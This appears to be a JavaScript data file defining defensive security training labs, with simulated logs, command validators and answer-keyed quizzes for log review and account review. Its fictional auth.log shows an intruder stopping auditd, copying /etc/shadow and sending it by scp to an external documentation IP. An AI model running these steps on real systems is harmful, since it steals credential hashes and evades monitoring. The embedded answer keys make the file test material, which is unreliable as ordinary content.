        question: 'Nikto reported `/admin/` returning HTTP 200 and `PHPSESSID` without the HttpOnly flag. Why do those matter?',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'An exposed admin path expands the attack surface for credential stuffing or brute force', correct: true },
          { id: 'b', text: 'Missing HttpOnly raises session-cookie theft risk if XSS is present', correct: true },
          { id: 'c', text: 'A 200 response on /admin/ proves the app is fully patched', correct: false },
          { id: 'd', text: 'HttpOnly only affects TLS certificate validation', correct: false },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-3.ex3.s2' },
        reinforces: 'sa-3.ex3.s2',
      },
    ],

    completion: { requireAllSteps: true, minQuizScore: 0.8 },
  };

  // ────────────────────────────────────────────────────────────
  //  sa-4  System Log Assessment
  // ────────────────────────────────────────────────────────────
  function buildSa4AuthLog() {
    // Narrative: attacker stops auditd before privesc; password-guess + sudo abuse from temp.contractor.
    return [
      'Apr 22 08:00:01 DC-01 systemd[1]: Started Daily apt download activities.',
      'Apr 22 08:14:05 DC-01 sshd[2118]: Accepted password for j.sanders from 10.10.24.42 port 51022 ssh2',
      'Apr 22 08:14:05 DC-01 sshd[2118]: pam_unix(sshd:session): session opened for user j.sanders by (uid=0)',
      'Apr 22 08:30:11 DC-01 sshd[2188]: Accepted publickey for m.chen from 10.10.24.18 port 51100 ssh2',
      'Apr 22 09:00:33 DC-01 sudo: helpdesk-admin : TTY=pts/0 ; PWD=/home/helpdesk-admin ; USER=root ; COMMAND=/usr/bin/systemctl status sshd',
      'Apr 22 14:01:18 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:21 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:24 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:26 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:30 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:32 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:35 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:02:09 DC-01 sshd[3219]: Accepted password for temp.contractor from 198.51.100.42 port 38922 ssh2',
      'Apr 22 14:02:09 DC-01 sshd[3219]: pam_unix(sshd:session): session opened for user temp.contractor by (uid=0)',
      'Apr 22 14:04:55 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/bin/systemctl stop auditd',
      'Apr 22 14:04:56 DC-01 systemd[1]: Stopping Security Auditing Service...',
      'Apr 22 14:04:56 DC-01 systemd[1]: auditd.service: Deactivated successfully.',
      'Apr 22 14:04:56 DC-01 systemd[1]: Stopped Security Auditing Service.',
      'Apr 22 14:05:09 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/bin/cp /etc/shadow /tmp/.cache.bak',
      'Apr 22 14:06:21 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/usr/bin/scp /tmp/.cache.bak temp.contractor@198.51.100.42:/home/temp.contractor/',
      'Apr 22 14:42:11 DC-01 sshd[3219]: Received disconnect from 198.51.100.42 port 38922:11: disconnected by user',
      'Apr 22 14:42:11 DC-01 sshd[3219]: pam_unix(sshd:session): session closed for user temp.contractor',
    ].join('\n') + '\n';
  }

  function buildSa4Syslog() {
    return [
      'Apr 22 08:00:01 DC-01 systemd[1]: Started Daily apt download activities.',
      'Apr 22 08:14:05 DC-01 systemd-logind[833]: New session 21 of user j.sanders.',
      'Apr 22 09:00:33 DC-01 systemd[1]: Started Session 23 of user helpdesk-admin.',
      'Apr 22 14:04:56 DC-01 systemd[1]: auditd.service: Deactivated successfully.',
      'Apr 22 14:04:56 DC-01 systemd[1]: Stopped Security Auditing Service.',
      'Apr 22 14:42:11 DC-01 systemd-logind[833]: Removed session 31.',
    ].join('\n') + '\n';
  }

  function buildSa4Fs() {
    return {
      'home': { 'student': { '.bashrc': '' } },
      'etc': {
        'rsyslog.conf': '# /etc/rsyslog.conf\n# Forward all to a remote SIEM\n*.* @10.10.24.5:514\n',
        'logrotate.d': { 'custom_logs': '/var/log/custom_log {\n    daily\n    rotate 7\n    compress\n    missingok\n    notifempty\n    create 0640 root utmp\n}\n' },
        'logstash': { 'conf.d': { 'logstash.conf': 'input {\n  file { path => "/var/log/syslog" start_position => "beginning" }\n}\noutput {\n  elasticsearch { hosts => ["localhost:9200"] index => "syslog" }\n}\n' } },
      },
      'var': {
        'log': {
          'auth.log': buildSa4AuthLog(),
          'syslog':   buildSa4Syslog(),
          'auditd.journal': '-- No entries --\n',
          'kern.log': '',
        },
      },
      'tmp': {},
      'run': { 'services': {} },
    };
  }

  const SA4_LAB = {
    id: 'sa-4',
    track: 'security-assessments',
    title: 'System Log Assessment',
    difficulty: 'Intermediate',
    estimatedTime: '55 min',
    icon: '📜',
    tags: ['Rsyslog', 'Logwatch', 'Logrotate', 'Splunk', 'ELK'],

    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-4-System Log Assessment.md',
      sha256: '914b093adfc6241772a2362be40cd01392f42a8a8a05b0983c093145773fab0d',
      snapshot: 'src/data/sources/sa-4.source.md',
    },

    environment: { type: 'linux', shell: 'LinuxTerminalShell', fs: buildSa4Fs },

    scenario: {
      role: 'SOC analyst on the log-review rotation',
      incident: 'DC-01 stopped reporting audit events to the SIEM around 14:04 yesterday. Rsyslog forwarding looks healthy. Triage /var/log/auth.log and /var/log/syslog to find why audit data went silent.',
    },

    exercises: [
      {
        id: 'ex1',
        upstreamHeading: 'Exercise 1: Configuring Centralized Logging with Rsyslog',
        steps: [
          {
            id: 'sa-4.ex1.s1',
            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install rsyslog' },
            kind: 'command',
            instruction: 'Install rsyslog.',
            hint: '`sudo apt-get install rsyslog`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?rsyslog\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex1.s2',
            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'Edit /etc/rsyslog.conf to forward to a remote log server' },
            kind: 'command',
            instruction: 'Read /etc/rsyslog.conf to confirm the forward rule.',
            hint: '`cat /etc/rsyslog.conf`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/rsyslog\.conf\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
            checkOnLearning: 'sa4-q5',
          },
          {
            id: 'sa-4.ex1.s3',
            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'sudo systemctl restart rsyslog' },
            kind: 'command',
            instruction: 'Restart rsyslog.',
            hint: '`sudo systemctl start rsyslog` or `restart`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+(start|restart)\s+rsyslog\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
        ],
      },
      {
        id: 'ex2',
        upstreamHeading: 'Exercise 2: Log Analysis with Logwatch',
        steps: [
          {
            id: 'sa-4.ex2.s1',
            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install logwatch' },
            kind: 'command',
            instruction: 'Install logwatch.',
            hint: '`sudo apt-get install logwatch`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?logwatch\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex2.s2',
            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'sudo logwatch --detail high --logfile /var/log/syslog --range today --service all --print' },
            kind: 'command',
            instruction: 'Generate a high-detail logwatch summary for today.',
            hint: '`sudo logwatch --detail high --logfile /var/log/syslog --range today --service all --print`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?logwatch\s+(--detail\s+\w+)?(\s+--logfile\s+\/var\/log\/syslog)?(\s+--range\s+\w+)?(\s+--service\s+\w+)?(\s+--print)?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa4-q2',
          },
        ],
      },
      {
        id: 'ex3',
        upstreamHeading: 'Exercise 3: Log Rotation with Logrotate',
        steps: [
          {
            id: 'sa-4.ex3.s1',
            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'Edit /etc/logrotate.d/custom_logs' },
            kind: 'command',
            instruction: 'Read the existing custom_logs rotation policy.',
            hint: '`cat /etc/logrotate.d/custom_logs`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/logrotate\.d\/custom_logs\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex3.s2',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'sudo logrotate -d /etc/logrotate.d/custom_logs' },
            kind: 'command',
            instruction: 'Dry-run logrotate against the custom_logs policy.',
            hint: '`sudo logrotate -d /etc/logrotate.d/custom_logs`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?logrotate\s+-d\s+\/etc\/logrotate\.d\/custom_logs\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
        ],
      },
      {
        id: 'ex4',
        upstreamHeading: 'Exercise 4: Real-time Log Monitoring with Splunk',
        steps: [
          {
            id: 'sa-4.ex4.s1',
            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'wget splunk .deb && sudo dpkg -i splunk.deb' },
            kind: 'command',
            instruction: 'Download the Splunk .deb package.',
            hint: '`wget https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-amd64.deb`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?wget\s+https?:\/\/[^\s]+splunk[^\s]+\.deb\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex4.s2',
            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'sudo /opt/splunk/bin/splunk start --accept-license' },
            kind: 'analyze',
            instruction: 'Page through /var/log/auth.log and identify which user account succeeded after a burst of failed passwords. Submit just the username.',
            hint: '`less /var/log/auth.log` — look for repeated "Failed password for X" then an "Accepted password for X" within seconds.',
            validation: { type: 'valueExtracted', expected: ['temp.contractor'] },
            points: 15,
            checkOnLearning: 'sa4-q1',
          },
          {
            id: 'sa-4.ex4.s3',
            upstream: { exercise: 'Exercise 4', stepNumber: 3, sourceLine: 'Add /var/log as a Splunk data source' },
            kind: 'analyze',
            instruction: 'After that login, what privileged action did the same user take to suppress audit telemetry? Submit the systemd unit name they stopped.',
            hint: 'grep auth.log for "sudo" and "stop" — look at the COMMAND= clause.',
            validation: { type: 'valueExtracted', expected: ['auditd', 'auditd.service'] },
            points: 15,
          },
        ],
      },
      {
        id: 'ex5',
        upstreamHeading: 'Exercise 5: Visualizing Log Data with the ELK Stack',
        steps: [
          {
            id: 'sa-4.ex5.s1',
            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo apt-get install elasticsearch && sudo systemctl start elasticsearch' },
            kind: 'command',
            instruction: 'Start Elasticsearch.',
            hint: '`sudo systemctl start elasticsearch`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+start\s+elasticsearch\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s2',
            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'sudo apt-get install logstash' },
            kind: 'command',
            instruction: 'Install Logstash.',
            hint: '`sudo apt-get install logstash`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?logstash\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s3',
            upstream: { exercise: 'Exercise 5', stepNumber: 3, sourceLine: 'Configure /etc/logstash/conf.d/logstash.conf' },
            kind: 'command',
            instruction: 'Read the Logstash pipeline config.',
            hint: '`cat /etc/logstash/conf.d/logstash.conf`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/logstash\/conf\.d\/logstash\.conf\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s4',
            upstream: { exercise: 'Exercise 5', stepNumber: 4, sourceLine: 'sudo systemctl start logstash' },
            kind: 'command',
            instruction: 'Start Logstash.',
            hint: '`sudo systemctl start logstash`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+start\s+logstash\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s5',
            upstream: { exercise: 'Exercise 5', stepNumber: 5, sourceLine: 'sudo apt-get install kibana' },
            kind: 'command',
            instruction: 'Install Kibana.',
            hint: '`sudo apt-get install kibana`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?kibana\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s6',
            upstream: { exercise: 'Exercise 5', stepNumber: 6, sourceLine: 'Open http://localhost:5601 in a browser to view Kibana' },
            kind: 'command',
            instruction: 'Confirm Kibana is responding on its default port.',
            hint: '`curl -s http://localhost:5601`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?(curl|wget)\s+(-s\s+)?https?:\/\/localhost:5601\/?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa4-q3',
          },
        ],
      },
    ],

    checkOnLearning: [
      {
        id: 'sa4-q1',
        bloom: 'analysis',
        question: 'You found 7 consecutive "Failed password for temp.contractor" entries followed by an "Accepted password" within ~30s, all from 198.51.100.42. Pick every reasonable conclusion.',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'The account is being brute-forced from an external (RFC 5737) IP', correct: true },
          { id: 'b', text: 'The successful login means the password was guessed or known', correct: true },
          { id: 'c', text: 'temp.contractor merely mistyped their password seven times', correct: false },
          { id: 'd', text: 'PAM lockout (pam_tally2 deny=5) is either disabled or misconfigured on this host', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-4.ex4.s2' },
        reinforces: 'sa-4.ex4.s2',
      },
      {
        id: 'sa4-q2',
        bloom: 'application',
        question: 'Your Logwatch summary still showed the key 14:04 system event even though full audit telemetry disappeared afterward. Which event best explains the gap?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'The host restarted rsyslog, interrupting remote forwarding only', correct: false },
          { id: 'b', text: 'The attacker stopped auditd, blinding host-level audit events after the sudo action', correct: true },
          { id: 'c', text: 'Logrotate compressed auth.log too early', correct: false },
          { id: 'd', text: 'Kibana on port 5601 rejected the dashboard query', correct: false },
        ],
        triggerOn: { stepId: 'sa-4.ex2.s2' },
        reinforces: 'sa-4.ex2.s2',
      },
      {
        id: 'sa4-q3',
        bloom: 'recall',
        question: 'On default Debian/Ubuntu installs, which TCP port does Kibana listen on?',
        type: 'short-answer',
        acceptedAnswer: ['5601', 'tcp/5601'],
        triggerOn: { stepId: 'sa-4.ex5.s6' },
        reinforces: 'sa-4.ex5.s6',
      },
      {
        id: 'sa4-q4',
        bloom: 'comprehension',
        question: 'The custom_logs logrotate policy specifies `rotate 7`. What does that number control?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'The number of days a single rotation covers', correct: false },
          { id: 'b', text: 'The number of historical rotated copies retained', correct: true },
          { id: 'c', text: 'The compression level', correct: false },
          { id: 'd', text: 'The minimum size before rotating', correct: false },
        ],
        triggerOn: { stepId: 'sa-4.ex3.s2' },
        reinforces: 'sa-4.ex3.s2',
      },
      {
        id: 'sa4-q5',
        bloom: 'comprehension',
        question: 'The rsyslog line `*.* @10.10.24.5:514` means what?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'Forward all facilities and severities to 10.10.24.5 over UDP 514', correct: true },
          { id: 'b', text: 'Forward only kernel logs to 10.10.24.5 over TCP 514', correct: false },
          { id: 'c', text: 'Mirror all logs locally into /var/log/10.10.24.5', correct: false },
          { id: 'd', text: 'Rotate all logs every 514 minutes', correct: false },
        ],
        triggerOn: { stepId: 'sa-4.ex1.s2' },
        reinforces: 'sa-4.ex1.s2',
      },
    ],

    completion: { requireAllSteps: true, minQuizScore: 0.8 },
  };

  // Original source retained for attribution; this is the Mission Next SSH adaptation.
  function iamStep(ex, number, command, instruction, check, extra = {}) {
    return {
      id: `sa-5.ssh.ex${ex}.s${number}`,
      upstream: { exercise: 'Mission Next SSH access review', sourceLine: command || '' },
      kind: command ? 'command' : 'analyze',
      command,
      instruction,
      hint: command ? `Run \`${command}\` and read the output.` : null,
      acceptedInputs: command ? [{ type: 'exact', value: command }] : [],
      validation: { type: 'iamReview', check },
      points: 5,
      ...extra,
    };
  }

  const SA5_LAB = {
    id: 'sa-5',
    track: 'security-assessments',
    title: 'User Account Security Assessment',
    difficulty: 'Beginner',
    estimatedTime: '30 min',
    icon: '🪪',
    tags: ['SSH', 'sudo', 'IAM', 'Account Review'],
    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-5-User Account Security Assessment.md',
      sha256: 'bd458aefbd6caf390f2e95ff84985210d60fba730507d093793fb6e58b42bcd8',
      snapshot: 'src/data/sources/sa-5.source.md',
    },
    environment: { type: 'linux', shell: 'IamReviewShell', fs: () => window.MISSION_NEXT_IAM_REVIEW.buildFs() },
    scenario: {
      role: 'You are a junior IAM analyst completing approved ticket IAM-2059.',
      incident: 'Connect to the Ubuntu server iam-server using your assigned analyst account. Compare local accounts with the HR roster, investigate unusual contractor logins, remove unauthorized administrator access, and verify the result. The contractor still needs standard access. The training SSH key and trusted host key are already configured; all activity is simulated.',
    },
    beginnerGuide: 'SSH connects you to the server; Bash runs your commands there; sudo authorizes administrative actions. Type each shown command and press Enter. For findings, use the answer box. The guided sudoers editor has Save and Cancel buttons. Your workspace and progress resume when you return.',
    completionMessage: 'The access review and SOC escalation notes are recorded. Return to Module 2 to continue.',
    exercises: [
      { id: 'ex1', upstreamHeading: 'Connect and confirm the server', steps: [
        iamStep(1, 1, 'ssh analyst@iam-server', 'Open the approved SSH session using your assigned training key. Watch the prompt change to analyst@iam-server.', 'connected', {
          learning: { title: 'You connected through SSH', what: 'The preconfigured key authenticates the analyst and the trusted host key identifies iam-server.', why: 'Confirm the destination before reviewing or changing access.' },
        }),
        iamStep(1, 2, 'whoami', 'Confirm that your remote session uses the analyst account.', 'identity'),
        iamStep(1, 3, 'hostname', 'Confirm that you reached iam-server, the host named in the ticket.', 'host'),
      ] },
      { id: 'ex2', upstreamHeading: 'Find unauthorized administrator access', steps: [
        iamStep(2, 1, 'cat /home/analyst/hr-roster.txt', 'Read the approved access, source address, working hours, and change scope. Which account is a contractor?', 'rosterRead'),
        iamStep(2, 2, 'getent group sudo', 'List the administrator group. Compare its members with the HR roster and identify the contractor.', 'adminMembers'),
        iamStep(2, 3, 'sudo -l -U temp.contractor', 'Inspect the contractor’s effective sudo permissions. Notice both the group grant and the separate passwordless grant.', 'sudoListed', {
          learning: { title: 'Two paths grant administrator access', what: 'The sudo group permits administrator commands. A separate NOPASSWD: ALL rule grants them without a password prompt.', why: 'Removing one grant does not remove the other. Verification must inspect effective permissions.' },
        }),
      ] },
      { id: 'ex3', upstreamHeading: 'Investigate login evidence', steps: [
        iamStep(3, 1, "sudo grep -F 'temp.contractor' /var/log/auth.log", 'Read the contractor’s authentication and sudo events. Count failed passwords, then locate the successful login. Keep the evidence intact.', 'logRead'),
        iamStep(3, 2, null, 'Which source IP appears in the failed attempts and successful login? Compare it with the approved source in the HR roster, then enter the observed IP below.', 'sourceIp', { answerLabel: 'Observed source IP', points: 10 }),
        iamStep(3, 3, null, 'At what UTC time did the contractor successfully log in? Enter HH:MM:SS. Compare that time with the approved working hours.', 'loginTime', { answerLabel: 'Successful login time (UTC)', points: 10 }),
      ] },
      { id: 'ex4', upstreamHeading: 'Remove both unauthorized grants', steps: [
        iamStep(4, 1, 'sudo gpasswd -d temp.contractor sudo', 'Remove the contractor from the sudo group. Keep their engineering group and standard account access.', 'groupRemoved', { points: 10 }),
        iamStep(4, 2, 'sudo visudo', 'Open the guided sudoers editor. Delete the entire temp.contractor rule, keep the root and %sudo rules, then select Save. Opening the editor alone does not complete this step.', 'policySaved', { points: 10 }),
        iamStep(4, 3, 'sudo visudo -c', 'Check the saved sudoers configuration for errors before verifying permissions.', 'policyChecked'),
      ] },
      { id: 'ex5', upstreamHeading: 'Verify and record the findings', steps: [
        iamStep(5, 1, 'id temp.contractor', 'Confirm the account still exists and retains engineering membership, with no sudo group.', 'groupsListed'),
        iamStep(5, 2, 'sudo -l -U temp.contractor', 'Verify that the account is no longer allowed to run sudo. A denial is the expected successful outcome of this review.', 'permissionsVerified', {
          validation: { type: 'iamReview', check: 'permissionsVerified', exitCode: 1 },
          learning: { title: 'Administrator access is removed', what: 'The account retains standard access, but neither administrator grant remains.', why: 'Checking actual permissions confirms the change worked. This case has no existing contractor sessions or privileged processes to terminate.' },
        }),
        iamStep(5, 3, null, 'Write a short case note: account reviewed; group and direct sudoers grants removed; source IP; number of failed passwords; successful-login time in UTC; verification result; and escalation to the SOC. Preserve the original logs. Suspicious activity needs investigation, not an automatic conclusion that compromise is proven.', 'report', {
          answerLabel: 'IAM-2059 case note', answerMultiline: true, points: 15,
        }),
      ] },
    ],
    completion: { requireAllSteps: true },
  };

  // ────────────────────────────────────────────────────────────
  //  Register
  // ────────────────────────────────────────────────────────────
  Object.assign(window.MISSION_NEXT_LABS = window.MISSION_NEXT_LABS || {}, {
    'sa-2': SA2_LAB,
    'sa-3': SA3_LAB,
    'sa-4': SA4_LAB,
    'sa-5': SA5_LAB,
  });

  Object.assign(window, {
    MISSION_NEXT_SA_2: SA2_LAB,
    MISSION_NEXT_SA_3: SA3_LAB,
    MISSION_NEXT_SA_4: SA4_LAB,
    MISSION_NEXT_SA_5: SA5_LAB,
  });
})();
